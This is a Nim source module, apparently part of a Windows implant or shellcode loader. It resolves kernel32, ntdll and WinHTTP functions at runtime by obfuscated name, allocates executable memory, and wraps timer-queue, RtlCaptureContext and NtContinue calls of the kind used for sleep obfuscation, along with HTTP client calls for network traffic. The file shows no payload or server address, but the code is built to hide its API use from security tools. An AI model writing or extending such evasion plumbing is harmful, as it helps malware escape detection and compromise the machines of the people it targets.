import ../global
import utils

proc LoadLibraryA(lib: cstring): pointer {.stdcall, importc, dynlib: "kernel32".}
proc GetProcAddress(hMod, api: pointer): pointer {.stdcall, importc, dynlib: "kernel32".}

var k32mod: pointer

proc load*(api: string): pointer =
  # Resolves a kernel32 export and caches the module
  if k32mod == nil:
    var k32 = obf("kernel32")
    k32mod = LoadLibraryA(cast[cstring](unsafeAddr(k32[0])))
  GetProcAddress(k32mod, cast[pointer](cast[cstring](unsafeAddr(api[0]))))

template k32fn(T: typedesc; name: string; cache: untyped): untyped =
  # Loads a kernel32 function once and returns the cached pointer
  if cache == nil:
    cache = cast[T](load(name))
  cache

var
  fnCreateFileW: TCreateFileW
  fnReadFile: TReadFile
  fnCloseHandle: TCloseHandle
  fnGetFileSize: TGetFileSize
  fnVirtualAlloc: TVirtualAlloc
  fnVirtualFree: TVirtualFree
  fnGetModuleHandleA: TGetModuleHandleA
  fnVirtualProtect: TVirtualProtect
  fnLoadLibraryA: TLoadLibraryA
  fnGetProcAddress: TGetProcAddress
  fnSleep: TSleep
  fnGetTickCount: TGetTickCount
  fnWaitForSingleObjectEx: TWaitForSingleObjectEx
  fnRtlCreateTimerQueue: TRtlCreateTimerQueue
  fnRtlCreateTimer: TRtlCreateTimer
  fnRtlDeleteTimerQueue: TRtlDeleteTimerQueue
  fnRtlDeleteTimerQueueEx: TRtlDeleteTimerQueueEx
  fnRtlRegisterWait: TRtlRegisterWait
  fnRtlDeregisterWait: TRtlDeregisterWait
  fnRtlCaptureContext: TRtlCaptureContext
  fnNtContinue: TNtContinue
  fnNtSetEvent: TNtSetEvent
  fnNtCreateEvent: TNtCreateEvent
  fnNtWait: TNtWait
  fnNtSignalAndWait: TNtSignalAndWait
  fnNtClose: TNtClose
  fnGetCurrentProcessId: TGetCurrentProcessId
  fnGetCurrentThreadId: TGetCurrentThreadId
  fnOpenThread: TOpenThread

proc createFileW*(path: pointer; access, share: culong; sec: pointer; disp, flags, tmpl: culong): pointer =
  # Opens or creates a file through CreateFileW
  k32fn(TCreateFileW, obf("CreateFileW"), fnCreateFileW)(path, access, share, sec, disp, flags, tmpl)

proc readFile*(h, buf: pointer; sz: culong; read: ptr culong; ov: pointer): culong =
  # Reads bytes from an open file handle
  k32fn(TReadFile, obf("ReadFile"), fnReadFile)(h, buf, sz, read, ov)

proc closeHandle*(h: pointer): culong =
  # Closes a kernel object handle
  k32fn(TCloseHandle, obf("CloseHandle"), fnCloseHandle)(h)

proc getFileSize*(h: pointer; hi: ptr culong): culong =
  # Returns the size of an open file
  k32fn(TGetFileSize, obf("GetFileSize"), fnGetFileSize)(h, hi)

proc allocRwx*(sz: csize_t): pointer =
  # Allocates memory with read write execute access
  k32fn(TVirtualAlloc, obf("VirtualAlloc"), fnVirtualAlloc)(nil, sz, 0x3000, 0x40)

proc allocRw*(sz: csize_t): pointer =
  # Allocates memory with read write access
  k32fn(TVirtualAlloc, obf("VirtualAlloc"), fnVirtualAlloc)(nil, sz, 0x3000, 0x04)

proc freeMem*(p: pointer): culong =
  # Releases a virtual memory block
  k32fn(TVirtualFree, obf("VirtualFree"), fnVirtualFree)(p, 0, 0x8000)

proc getModuleHandleA*(name: string = ""; currentModule: bool = false): pointer =
  # Returns a loaded module handle or the current module
  let fn = k32fn(TGetModuleHandleA, obf("GetModuleHandleA"), fnGetModuleHandleA)
  if currentModule or name.len == 0:
    fn(nil)
  else:
    fn(cast[cstring](unsafeAddr(name[0])))

proc virtualProtect*(lp: pointer; sz: culong; np: culong; old: var culong): culong =
  # Changes the protection of a memory region
  k32fn(TVirtualProtect, obf("VirtualProtect"), fnVirtualProtect)(lp, sz, np, addr old)

proc loadLibraryA*(lib: string): pointer =
  # Loads a dll and returns its module handle
  k32fn(TLoadLibraryA, obf("LoadLibraryA"), fnLoadLibraryA)(cast[cstring](unsafeAddr(lib[0])))

proc getProcAddress*(hMod: pointer; name: string): pointer =
  # Finds an exported function by name
  k32fn(TGetProcAddress, obf("GetProcAddress"), fnGetProcAddress)(
    hMod, cast[pointer](cast[cstring](unsafeAddr(name[0]))))

proc sleepMs*(ms: culong) =
  # Sleeps the current thread for the given milliseconds
  k32fn(TSleep, obf("Sleep"), fnSleep)(ms)

proc getTickCount*(): culong =
  # Returns the system tick count in milliseconds
  k32fn(TGetTickCount, obf("GetTickCount"), fnGetTickCount)()

proc waitForSingleObjectEx*(h: pointer; ms: culong; alertable: culong = 0): culong =
  # Waits on a handle until it signals or the timeout expires
  k32fn(TWaitForSingleObjectEx, obf("WaitForSingleObjectEx"), fnWaitForSingleObjectEx)(h, ms, alertable)

var ntmod: pointer

proc ntload(api: string): pointer =
  # Resolves an ntdll export and caches the module
  if ntmod == nil:
    ntmod = getModuleHandleA(obf("ntdll.dll"))
  getProcAddress(ntmod, api)

template ntfn(T: typedesc; name: string; cache: untyped): untyped =
  # Loads an ntdll function once and returns the cached pointer
  if cache == nil:
    cache = cast[T](ntload(name))
  cache

proc rtlCreateTimerQueue*(): pointer =
  # Creates a timer queue and returns its handle
  var q: pointer
  if ntfn(TRtlCreateTimerQueue, obf("RtlCreateTimerQueue"), fnRtlCreateTimerQueue)(addr q) != 0:
    nil
  else:
    q

proc rtlCreateTimer*(queue: pointer; cb, ctx: pointer; due, period, flags: culong): culong =
  # Adds a timer callback to an existing queue
  var t: pointer
  ntfn(TRtlCreateTimer, obf("RtlCreateTimer"), fnRtlCreateTimer)(queue, addr t, cb, ctx, due, period, flags)

proc rtlDeleteTimerQueue*(queue: pointer): culong =
  # Deletes a timer queue
  ntfn(TRtlDeleteTimerQueue, obf("RtlDeleteTimerQueue"), fnRtlDeleteTimerQueue)(queue)

proc rtlDeleteTimerQueueEx*(queue, completionEvent: pointer): culong =
  # Deletes a timer queue and waits on a completion event
  ntfn(TRtlDeleteTimerQueueEx, obf("RtlDeleteTimerQueueEx"), fnRtlDeleteTimerQueueEx)(queue, completionEvent)

proc rtlRegisterWait*(handle: pointer; cb, ctx: pointer; ms, flags: culong; wait: ptr pointer = nil): culong =
  # Registers a wait callback for a handle
  var w: pointer
  result = ntfn(TRtlRegisterWait, obf("RtlRegisterWait"), fnRtlRegisterWait)(addr w, handle, cb, ctx, ms, flags)
  if wait != nil and result == 0:
    wait[] = w

proc rtlDeregisterWait*(wait: pointer): culong =
  # Removes a previously registered wait
  ntfn(TRtlDeregisterWait, obf("RtlDeregisterWait"), fnRtlDeregisterWait)(wait)

proc rtlCaptureContext*(): pointer =
  # Resolves RtlCaptureContext and returns the pointer
  ntfn(TRtlCaptureContext, obf("RtlCaptureContext"), fnRtlCaptureContext)

proc ntContinue*(): pointer =
  # Resolves NtContinue and returns the pointer
  ntfn(TNtContinue, obf("NtContinue"), fnNtContinue)

proc getCurrentProcessId*(): culong =
  # Returns the current process id
  k32fn(TGetCurrentProcessId, obf("GetCurrentProcessId"), fnGetCurrentProcessId)()

proc getCurrentThreadId*(): culong =
  # Returns the current thread id
  k32fn(TGetCurrentThreadId, obf("GetCurrentThreadId"), fnGetCurrentThreadId)()

proc openThread*(access, inherit, tid: culong): pointer =
  # Opens a thread by id and returns its handle
  k32fn(TOpenThread, obf("OpenThread"), fnOpenThread)(access, inherit, tid)

# ======================
# winhttp
# ======================
var whmod: pointer

proc whload(api: string): pointer =
  # Resolves a winhttp export and caches the module
  if whmod == nil: whmod = loadLibraryA(obf("winhttp"))
  getProcAddress(whmod, api)

template whfn(T: typedesc; name: string; cache: untyped): untyped =
  # Loads a winhttp function once and returns the cached pointer
  if cache == nil: cache = cast[T](whload(name))
  cache

var
  fnWinHttpOpen: TWinHttpOpen
  fnWinHttpConnect: TWinHttpConnect
  fnWinHttpOpenRequest: TWinHttpOpenRequest
  fnWinHttpSendRequest: TWinHttpSendRequest
  fnWinHttpReceiveResponse: TWinHttpReceiveResponse
  fnWinHttpQueryHeaders: TWinHttpQueryHeaders
  fnWinHttpReadData: TWinHttpReadData
  fnWinHttpCloseHandle: TWinHttpCloseHandle
  fnWinHttpSetOption: TWinHttpSetOption
  fnWinHttpAddRequestHeaders: TWinHttpAddRequestHeaders

proc winHttpOpen*(agent: pointer; access: culong; proxy, bypass: pointer; flags: culong): pointer =
  # Opens a winhttp session
  whfn(TWinHttpOpen, obf("WinHttpOpen"), fnWinHttpOpen)(agent, access, proxy, bypass, flags)

proc winHttpConnect*(session: pointer; host: pointer; port: uint16; flags: culong): pointer =
  # Connects a session to a host and port
  whfn(TWinHttpConnect, obf("WinHttpConnect"), fnWinHttpConnect)(session, host, port, flags)

proc winHttpOpenRequest*(conn: pointer; verb, path, version, referrer: pointer; accept: pointer; flags: culong): pointer =
  # Opens an http request on a connection
  whfn(TWinHttpOpenRequest, obf("WinHttpOpenRequest"), fnWinHttpOpenRequest)(conn, verb, path, version, referrer, accept, flags)

proc winHttpSendRequest*(req: pointer; headers: pointer; hlen: culong; body: pointer; blen, total: culong; ctx: culong): culong =
  # Sends an http request with optional headers and body
  whfn(TWinHttpSendRequest, obf("WinHttpSendRequest"), fnWinHttpSendRequest)(req, headers, hlen, body, blen, total, ctx)

proc winHttpReceiveResponse*(req: pointer; reserved: pointer): culong =
  # Waits for the response of an http request
  whfn(TWinHttpReceiveResponse, obf("WinHttpReceiveResponse"), fnWinHttpReceiveResponse)(req, reserved)

proc winHttpQueryHeaders*(req: pointer; level: culong; name: pointer; buf: pointer; blen: ptr culong; idx: ptr culong): culong =
  # Reads response headers into a buffer
  whfn(TWinHttpQueryHeaders, obf("WinHttpQueryHeaders"), fnWinHttpQueryHeaders)(req, level, name, buf, blen, idx)

proc winHttpReadData*(req: pointer; buf: pointer; toRead: culong; read: ptr culong): culong =
  # Reads response body bytes into a buffer
  whfn(TWinHttpReadData, obf("WinHttpReadData"), fnWinHttpReadData)(req, buf, toRead, read)

proc winHttpCloseHandle*(h: pointer): culong =
  # Closes a winhttp handle
  whfn(TWinHttpCloseHandle, obf("WinHttpCloseHandle"), fnWinHttpCloseHandle)(h)

proc winHttpSetOption*(h: pointer; opt: culong; buf: pointer; blen: culong): culong =
  # Sets an option on a winhttp handle
  whfn(TWinHttpSetOption, obf("WinHttpSetOption"), fnWinHttpSetOption)(h, opt, buf, blen)

proc winHttpAddRequestHeaders*(req: pointer; headers: pointer; hlen: culong; mods: culong): culong =
  # Adds headers to an open http request
  whfn(TWinHttpAddRequestHeaders, obf("WinHttpAddRequestHeaders"), fnWinHttpAddRequestHeaders)(req, headers, hlen, mods)
